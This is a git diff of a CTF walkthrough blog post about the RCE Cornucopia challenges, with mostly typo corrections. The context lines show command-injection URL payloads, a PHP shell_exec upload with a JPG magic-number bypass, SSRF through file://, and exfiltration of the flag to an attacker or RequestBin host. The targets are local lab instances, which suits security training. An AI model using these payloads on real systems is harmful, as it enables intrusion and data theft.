@@ -1,12 +1,10 @@
 ---
 layout: post
-title:  "RCE Cornucopia - Walkthrough"
+title:  "RCE Cornucopia - Walk-through"
 date:   2018-10-31
 ---
 
-RCE Cornucopia is a series of remote code execution challenges created by [Dejan Zelic](https://dejandayoff.com) for the CTF at AppSec USA 2018. Deloyment information and solutions from the author are available [here](https://dejandayoff.com/rce-cornucopia---appsec-usa-2018-ctf-solution/).
-
-TODO for each level confirm previous tricks don't work.
+RCE Cornucopia is a series of remote code execution challenges created by [Dejan Zelic](https://dejandayoff.com) for the CTF at AppSec USA 2018. Deployment information and solutions from the author are available [here](https://dejandayoff.com/rce-cornucopia---appsec-usa-2018-ctf-solution/).
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce000.png)
 
@@ -74,7 +72,7 @@ Dang!
 
 The second-most obvious technique after `;` for chaining commands together is `&&` and `||` sometimes called an ['and list' or 'or list.'](http://www.tldp.org/LDP/abs/html/list-cons.html#LISTCONSREF)
 
-To use `&&` in the URL the ampersands must be encoded. Ampersands are an "unsafe" character per [RFC-1738](http://www.ietf.org/rfc/rfc1738.txt) and must be encoded when not in use as a parameter delimeter. `%26` as ampersand is one of those things you just remember after a while.
+To use `&&` in the URL the ampersands must be encoded. Ampersands are an "unsafe" character per [RFC-1738](http://www.ietf.org/rfc/rfc1738.txt) and must be encoded when not in use as a parameter delimiter. `%26` as ampersand is one of those things you just remember after a while.
 
 Try,
 
@@ -96,11 +94,11 @@ http://127.0.0.1:8083/index.php?domain=google.com&submit=Lookup
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce3-001.png)
 
-With our ability to chain commands pretty well defeated, let's try [command substitution](http://www.tldp.org/LDP/abs/html/commandsub.html). It is what it sounds like - replace a command with it's output on the commandline. A simple example,
+With our ability to chain commands pretty well defeated, let's try [command substitution](http://www.tldp.org/LDP/abs/html/commandsub.html). It is what it sounds like - replace a command with it's output on the command line. A simple example,
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce3-005.png)
 
-Trying command substition using backticks,
+Trying command substitution using back-ticks,
 
 ```
 http://127.0.0.1:8083/index.php?domain=`cat%20/tmp/flag.txt`&submit=Lookup
@@ -110,7 +108,7 @@ http://127.0.0.1:8083/index.php?domain=`cat%20/tmp/flag.txt`&submit=Lookup
 
 Hard to tell if that worked or not given the output.
 
-The format of WHOIS results depends on the TLD. Note in the following example looking up some random garbage returns a brief error, but looking up a nonexistant `.com` domain echos the domain in the error message. 
+The format of WHOIS results depends on the TLD. Note in the following example looking up some random garbage returns a brief error, but looking up a nonexistent `.com` domain echoes the domain in the error message. 
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce3-003.png)
 
@@ -220,13 +218,13 @@ what if i'm just a test file :'(
 * Connection #0 to host 127.0.0.1 left intact
 ```
 
-Bad things can happen when a web application serves user-provided files. This being a PHP application, the first thought should be, 'can I upload a PHP file?' and the second, 'will it exectue?'
+Bad things can happen when a web application serves user-provided files. This being a PHP application, the first thought should be, 'can I upload a PHP file?' and the second, 'will it execute?'
 
-Modify the request above to use a `.php` filename and replace the file contents with a quick `shell_exec` to `cat` the flag.
+Modify the request above to use a `.php` filename and replace the file contents with a quick `shell_exec` to `cat` the flag. [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) shown here since this is AppSec USA after all.
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce5-002.png)
 
-Answer to the firest question is yes, we can upload PHP files. But will it execute?
+Answer to the first question is yes, we can upload PHP files. But will it execute?
 
 ```
 # curl -v http://127.0.0.1:8085/uploads/b0d0320f1440a2b9a325ead8338cd45aabc89740b8ea633c7dc4a5c856a6215a.php
@@ -277,7 +275,7 @@ root@kali ~/A/corn# dd if=test.jpg of=jpgmagicnum.dat bs=1 count=4
 4 bytes transferred in 0.000125 secs (31957 bytes/sec)
 ```
 
-`cat` the magic number plus the malicious PHP payload which will print the flag into a new file. Why use a PHP file extension and not JPG? We found earlier that it doesn't matter as far as the file being rejected or not, but it might matter in terms of whether the server will decide to execute our file as PHP. To be on the safe side, just make it a `.php` file.
+`cat` the magic number plus the malicious PHP payload into a new file. Why use a PHP file extension and not JPG? We found earlier that it doesn't matter as far as the file being rejected or not, but it might matter in terms of whether the server will decide to execute our file as PHP.
 
 ```
 root@kali ~/A/corn# cat flag.php 
@@ -285,7 +283,7 @@ root@kali ~/A/corn# cat flag.php
 root@kali ~/A/corn# cat jpgmagicnum.dat flag.jpg > pwn.php
 ```
 
-The magic number in front of our PHP payload is enough to fool the `file` command.
+The magic number in front of our PHP payload is enough to fool the `file` command locally.
 
 ```
 root@kali ~/A/corn# cat pwn.php 
@@ -425,7 +423,7 @@ The command we'll run is to `cat` the flag to the matched file (Sam). The follow
 
 ```
 root@kali ~/A/c/08# find . -name Sam -exec cat /tmp/flag.txt {} +
-localPOCflag
+flag{localPOCflag}
 ```
 
 So our payload is,
@@ -477,7 +475,7 @@ http://127.0.0.1:8089/index.php?url=file%3A%2F%2F%2Ftmp%2Fflag.txt&string=flag&s
 
 By design, the application requests a page on the Internet that we specify and searches it for a string. What if we use a domain under our control and include the flag value in the URL? Something like `http://attacker.hax/<flag>`.
 
-There's a project called [RequestBin](https://github.com/Runscope/requestbin) that provides you a tokenized URL and access to a panel which shows all requests made to that URL. Unforunately "the" RequestBin has been taken offline due to abuse, but if you Google you can find another one that's up or host your own. 
+There's a project called [RequestBin](https://github.com/Runscope/requestbin) that provides you a tokenized URL and access to a panel which shows all requests made to that URL. Unfortunately "the" RequestBin has been taken offline due to abuse, but if you Google you can find another one that's up or host your own. 
 
 For the moment I'll use [https://requestbin.fullcontact.com/](https://requestbin.fullcontact.com/). My bin URL is `http://requestbin.fullcontact.com/1m06f111`
 
@@ -524,7 +522,7 @@ Success.
 
 ## Solution 2 - Blind Boolean
 
-This challenge can be solved without requiring unlimited outbount Internet access from the web server. What if there was a whitelist of domains or it could only be used internally on a local network? 
+This challenge can be solved without requiring unlimited outbound Internet access from the web server. What if there was a white-list of domains or it could only be used internally on a local network? 
 
 We can do this by guessing each character from front to back. We know the flag starts with `flag{` and can check for that. We'll ask, does it start with `flag{a`? or `flag{b`? or `flag{c`? and so on... Once the first letter is found (we'll look for a 'Yaaaaaassssss' in the response to determine this), repeat the same for the next character, and so on.
 
